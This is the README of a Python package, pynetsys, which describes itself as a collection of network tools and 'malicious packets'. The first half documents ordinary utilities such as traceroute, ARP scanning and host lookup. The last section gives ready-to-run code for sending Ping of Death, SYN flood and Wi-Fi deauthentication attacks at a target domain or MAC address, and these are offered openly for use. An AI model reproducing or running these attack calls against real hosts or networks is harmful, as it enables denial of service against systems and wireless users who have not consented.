# PYNETSYS

pynetsys is a collection of tools and malicious packets.

Developed by Andrea Vaccaro from ANDRVV (c) 2022

# Installing

Linux, MacOS = ```pip3 install pynetsys --user```

Windows = ```pip install pynetsys --user```

# Tools

```python
import pynetsys

trace = pynetsys.tool.traceroute("python.org") --> list
print(trace)

arping = pynetsys.tool.arp() --> dict
print(arping)

hostinfo = pynetsys.tool.hostlookup("python.org") --> dict
print(hostinfo)

networks = pynetsys.tool.networkFinder() --> dict
print(hostinfo)

----------------

isonline = pynetsys.isOnline("python.org") --> bool
print(isonline)

haswebprotocol = pynetsys.hasWebProtocol("http:\\python.org") --> bool
OR
haswebprotocol = pynetsys.hasWebProtocol("python.org") --> bool 
print(haswebprotocol)

hasSSLwebprotocol = pynetsys.hasSSLWebProtocol("https:\\python.org") --> bool
OR
hasSSLwebprotocol = pynetsys.hasSSLWebProtocol("python.org") --> bool 
print(hasSSLwebprotocol)

addwebprotocol = pynetsys.addWebProtocol("python.org") --> str
print(addwebprotocol)

removewebprotocol = pynetsys.removeWebProtocol("https:\\python.org") --> str 
OR
removewebprotocol = pynetsys.removeWebProtocol("http:\\python.org") --> str 
print(removewebprotocol)
```

# Create malicious packet and send

```python
import pynetsys

PACKET, ID = pynetsys.packet.packet(target = "example.org", attack = Packets.DEATH_PING)
pynetsys.packet.start(PACKET, ID, _verbose = 0)

PACKET, ID = pynetsys.packet.packet(target = "example.org", attack = Packets.SYN_FLOOD)
pynetsys.packet.start(PACKET, ID, _verbose = 0)

PACKET, ID = pynetsys.packet.packet(target = "aa:bb:cc:dd:ee:ff", attack = Packets.WIRELESS_DEAUTH)
pynetsys.packet.start(PACKET, ID, _verbose = 0)

```
